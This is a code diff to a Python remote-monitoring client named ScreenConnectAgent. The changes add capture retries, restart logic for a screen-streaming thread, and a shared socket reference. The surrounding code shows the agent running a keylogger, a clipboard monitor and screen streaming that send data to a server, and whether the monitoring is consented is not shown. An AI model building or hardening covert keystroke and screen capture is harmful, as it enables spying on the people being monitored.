@@ -653,6 +653,11 @@ _adv_last_frame_pkt:  Optional[bytes] = None
 _adv_sio_async  = None   # socketio.AsyncClient — set when async loop starts
 _adv_viewers    = 0
 _adv_authed     = False
+_main_sio_ref   = None  # set by main() so adv tasks can reach the main socket for fallback
+
+def _get_main_sio():
+    """Return the main socket.io client so the adv task can use it as a frame fallback."""
+    return _main_sio_ref
 _adv_loop: Optional[asyncio.AbstractEventLoop] = None
 _adv_thread: Optional[threading.Thread] = None
 _adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")
@@ -661,10 +666,23 @@ _adv_pool   = ThreadPoolExecutor(max_workers=2, thread_name_prefix="adv-enc")
 async def _adv_task_stream_frames():
     """Second-site frame streaming loop — continuous, no ACK gate."""
     global _adv_last_frame_pkt
-    capture = _make_capture()
-    frame   = capture.grab()
-    if frame is None:
-        log.error("Advanced Monitor: initial capture failed"); return
+    # FIX: retry capture init instead of returning early — returning exits asyncio.gather
+    # which disconnects the adv socket and breaks streaming permanently.
+    capture = None
+    frame   = None
+    for _attempt in range(10):
+        try:
+            capture = _make_capture()
+            frame   = capture.grab()
+            if frame is not None:
+                break
+            log.warning(f"Advanced Monitor: grab returned None (attempt {_attempt+1}) — retrying in 2s")
+        except Exception as _ce:
+            log.warning(f"Advanced Monitor: capture init error ({_ce}) — retrying in 2s")
+            capture = None
+        await asyncio.sleep(2)
+    if capture is None or frame is None:
+        log.error("Advanced Monitor: capture failed after 10 attempts — stream task exiting"); return
 
     h, w = frame.shape[:2]
     encoder, enc_flag = _make_encoder(w, h, CONFIG["STREAM_FPS"], CONFIG["STREAM_QUALITY"])
@@ -916,9 +934,12 @@ _adv_monitor_started = False  # ensure we only start it once
 def start_advanced_monitor(server_url: str, token: str):
     """Launch the async advanced monitor engine in a dedicated thread."""
     global _adv_loop, _adv_thread, _adv_monitor_started
-    if _adv_monitor_started:
+    # FIX: check thread liveness, not just the flag — thread may have died silently
+    if _adv_monitor_started and _adv_thread and _adv_thread.is_alive():
         log.info("Advanced Monitor already running — skipping restart")
         return
+    if _adv_monitor_started and not (_adv_thread and _adv_thread.is_alive()):
+        log.warning("Advanced Monitor thread died — restarting")
     _adv_monitor_started = True
 
     def _run():
@@ -930,7 +951,7 @@ def start_advanced_monitor(server_url: str, token: str):
                 _adv_loop.run_until_complete(_adv_main(server_url, token))
             except Exception as e:
                 log.warning(f"Advanced Monitor loop error: {e} — retrying in 5s")
-                time.sleep(5)
+            time.sleep(5)
 
     _adv_thread = threading.Thread(target=_run, daemon=True, name="adv-monitor")
     _adv_thread.start()
@@ -1985,7 +2006,9 @@ class ScreenConnectAgent:
 
     def _make_client(self):
         """Create a brand-new socketio.Client on every reconnect."""
+        global _main_sio_ref
         sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
+        _main_sio_ref = sio  # allow adv tasks to reach the main socket for frame fallback
         sys_monitor = SystemMonitor(sio)
         keylogger   = KeyLogger(sio)
         clipboard   = ClipboardMonitor(sio)
